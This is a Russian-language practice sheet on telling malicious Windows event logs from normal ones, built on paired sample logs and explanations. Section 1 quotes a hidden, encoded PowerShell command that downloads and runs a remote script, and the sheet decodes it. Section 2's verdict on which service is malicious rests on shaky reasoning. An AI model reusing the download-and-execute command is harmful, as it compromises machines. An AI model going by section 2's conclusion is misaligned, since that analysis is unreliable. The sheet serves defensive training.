# Практикум по анализу логов windows
## Отличаем вредоносные логи от нормальных

### 1. Процессы и powershell
Лог А:
```
Event ID: 4688 -- Создание процесса
Время: 10:15:22
Account Name: IVANOV
New Process Name: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
Parent Process: C:\Windows\Explorer.EXE
Command Line: powershell.exe Get-Process | Export-Csv C:\temp\process_list.csv
```

Лог Б:
```
Event ID: 4688 
Время: 03:42:17
Account Name: IVANOV
New Process Name: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
Parent Process: C:\Windows\System32\wmiprvse.exe
Command Line: powershell.exe -WindowStyle Hidden -EncodedCommand SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIABOAGUAdAAuAFcAZQBiAEMAbABpAGUAbgB0ACkALgBEAG8AdwBuAGwAbwBhAGQAUwB0AHIAaQBuAGcAKAAnAGgAdAB0AHAAOgAvAC8AMgAyADIALgAyADIAMgAuADIAMgAyAC4AMgAyADIALwBwAGEAbABvAGEAZABhAC4AcABzADEAJwApAA==
```

Разбор:

В данном примере вредоносный лог Б, потому что:
- Родительский процесс wmiprvse.exe - это компонент WMI (Windows Management Instrumentation). Он редко запускается PowerShell случайно. Часто используется
хакерами для удаленного выполнения команд.
- Ключ -WindowsStyle Hidden  - скрывает окно от пользователя
- Закодированная команда из лога (base64) - обфускация, чтобы скрыть вредоносный код. Если ее расшифровать, то получится:
"IEX (New-Object Net.WebClient).DownloadString('http://222.222.222.222/playload.ps1')"
- Также подозрительно позднее время

### 2. Cлужбы и автозагрузка
Лог А:
```
Event ID: 4697 -- Создание службы
Время: 14:22:10
Account Name: IVANOV
Service Name: AdobeFlashUpdate
Service File Name: C:\Program Files\Adobe\Flash Player\flashupdater.exe
Image Path: C:\Program Files\Adobe\Flash Player\flashupdater.exe --silent
Service Type: user mode service
Start Mode: Auto
```
Лог Б:
```
Event ID: 4697 
Время: 04:15:03
Account Name: IVANOV
Service Name: Microsoft Update Service
Service File Name: C:\Windows\System32\svchost.exe
Image Path: C:\Windows\System32\svchost.exe -k localservice -p
Service Type: user mode service
Start Mode: Auto
```

Разбор:

Вредоносный лог А, потому что:
- Adobe Flash умер в 2020 году, официально больше не поддерживается корпорацией адоб.
- Любая служба с flash в названии - почти наверняка малварь, маскирующееся под устаревшее ПО.

Всегда стоит учитывать контекст. Если такой программы нет на компьютере или пользователь ее не устанавливал, необходимо принять срочные меры

### 3. Входы в систему
Лог А:
```
Event ID: 4624 -- Успешный вход
Время: 09:30:15
Account Name: IVANOV
Logon Type: 2 (Interactive)
Workstation Name: IVANOV-PC
Source Network Address: 127.0.0.1
Process Name: C:\Windows\System32\winlogon.exe
```
Лог Б:
```
Event ID: 4624 
Время: 02:50:22
Account Name: IVANOV
Logon Type: 3 (Network)
Workstation Name: IVANOV-PC
Source Network Address: 192.168.1.200
Process Name: C:\Windows\System32\svchost.exe
```

Разбор:
В этом примере подозрительным выглядит лог Б, потому что:
- В логе А обычный вход с localhosh. Обычный утренний вход в систему
- В логе Б происходит сетевой вход с айпи адреса в локальной сети. Возможно это может быть администратор, но настораживает время подключения - 3 утра.
Нужно проверить, что это за устройство.
Конечно, вид входа 3 не всегда означает удаленный доступ к самому компьютеру, но в контеусте ночного времени это триггер для расследования.

### 4. Подозрительные пути
Лог А:
```
Event ID: 4688 
Время: 11:05:42
Account Name: IVANOV
New Process Name: C:\Users\IVANOV\AppData\Local\Temp\winupdate.exe
Parent Process: C:\Program Files\Google\Chrome\Application\chrome.exe
Command Line: "C:\Users\IVANOV\AppData\Local\Temp\winupdate.exe" /silent
```
Лог Б:
```
Event ID: 4688 
Время: 11:06:01
Account Name: SYSTEM
New Process Name: C:\Windows\System32\cleanmgr.exe
Parent Process: C:\Windows\System32\svchost.exe
Command Line: cleanmgr.exe /sagerun:1
```

Разбор:

Лог А выглядит вредоносным, потому что обновление виндовс лежит в папке пользовательского TEMP, оттуда вряд ли будут происходить обновления винды.
- Похоже файл был скачан из интернера (родительский процесс Google) и сразу запущен
- Флаг /silent - тихая установка

